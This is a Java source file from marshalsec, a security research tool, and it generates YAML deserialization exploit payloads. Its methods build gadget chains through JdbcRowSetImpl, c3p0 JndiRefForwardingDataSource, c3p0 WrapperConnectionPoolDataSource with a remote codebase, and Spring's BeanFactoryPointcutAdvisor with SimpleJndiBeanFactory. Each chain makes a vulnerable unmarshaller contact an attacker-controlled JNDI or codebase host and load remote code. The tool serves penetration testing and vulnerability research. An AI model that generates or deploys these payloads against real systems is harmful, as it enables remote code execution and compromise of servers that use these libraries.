/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec;


import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import com.sun.rowset.JdbcRowSetImpl;

import marshalsec.gadgets.Args;
import marshalsec.gadgets.C3P0WrapperConnPool;


/**
 * @author mbechler
 *
 */
public abstract class YAMLBase extends MarshallerBase<String> {

    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    public Object makeJdbcRowSet ( UtilFactory uf, String[] args ) throws Exception {
        Map<String, String> properties = new LinkedHashMap<>();
        properties.put("dataSourceName", writeString(args[ 0 ]));
        properties.put("autoCommit", "true");
        return writeObject(JdbcRowSetImpl.class, properties);
    }


    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    public Object makeRefDataSource ( UtilFactory uf, String[] args ) throws Exception {
        Map<String, String> props = new LinkedHashMap<>();
        props.put("jndiName", writeString(args[ 0 ]));
        props.put("loginTimeout", "0");
        return writeObject("com.mchange.v2.c3p0.JndiRefForwardingDataSource", props);
    }


    @Args ( minArgs = 2, args = {
        "codebase", "class"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    public Object makeWrapperConnPool ( UtilFactory uf, String[] args ) throws Exception {
        return writeObject(
            WrapperConnectionPoolDataSource.class,
            Collections.singletonMap("userOverridesAsString", writeString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[ 0 ], args[ 1 ]))));
    }


    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    public Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) throws Exception {
        Map<String, String> properties = new LinkedHashMap<>();
        String jndiUrl = args[ 0 ];
        properties.put("adviceBeanName", writeString(jndiUrl));
        properties.put(
            "beanFactory",
            writeObject(SimpleJndiBeanFactory.class, Collections.singletonMap("shareableResources", writeArray(writeString(jndiUrl))), 2));
        return writeSet(
            writeObject(DefaultBeanFactoryPointcutAdvisor.class, properties, 1),
            writeConstructor(DefaultBeanFactoryPointcutAdvisor.class, true));
    }


    protected String writeArray ( String... elems ) {
        StringBuilder sb = new StringBuilder();
        sb.append('[');
        boolean first = true;
        for ( String elem : elems ) {
            if ( !first ) {
                sb.append(',');
                sb.append(' ');
            }
            else {
                first = false;
            }
            sb.append(elem);
        }
        sb.append(']');
        return sb.toString();
    }


    protected String writeObject ( Class<?> clazz, Map<String, String> properties, String... consArgs ) {
        return writeObject(clazz.getName(), properties, consArgs);
    }


    protected String writeObject ( String clazz, Map<String, String> properties, String... consArgs ) {
        return writeObject(clazz, properties, 0, consArgs);
    }


    protected String writeObject ( Class<?> clazz, Map<String, String> properties, int level, String... consArgs ) {
        return writeObject(clazz.getName(), properties, level, consArgs);
    }


    protected String writeObject ( String clazz, Map<String, String> properties, int level, String... consArgs ) {
        StringBuilder sb = new StringBuilder();
        sb.append(writeConstructor(clazz, false, consArgs));

        if ( !properties.isEmpty() ) {
            int indent = ( level + 1 ) * 2;
            for ( Entry<String, String> prop : properties.entrySet() ) {
                sb.append('\n');
                for ( int i = 0; i < indent; i++ ) {
                    sb.append(' ');
                }
                sb.append(prop.getKey());
                sb.append(':').append(' ');
                sb.append(prop.getValue());
            }
        }
        return sb.toString();
    }


    protected String writeSet ( String... elements ) {
        StringBuilder sb = new StringBuilder();
        sb.append("set:");
        if ( elements.length == 0 ) {
            sb.append('\n');
        }
        else {
            for ( String elem : elements ) {
                sb.append('\n');
                sb.append("  ? ");
                sb.append(elem);
            }
        }
        return sb.toString();
    }


    protected String writeConstructor ( Class<?> clazz, boolean inline, String... args ) {
        return writeConstructor(clazz.getName(), inline, args);
    }


    protected String writeConstructor ( String clazz, boolean inline, String... args ) {
        StringBuilder sb = new StringBuilder();
        sb.append(constructorPrefix(inline));
        sb.append(clazz);
        if ( constructorArgumentsSupported() && ( inline || args.length != 0 ) ) {
            sb.append(' ');
            sb.append(writeArray(args));
        }
        return sb.toString();
    }


    protected abstract String constructorPrefix ( boolean inline );


    protected abstract boolean constructorArgumentsSupported ();


    protected String writeString ( String string ) {
        return '"' + string + '"';
    }

}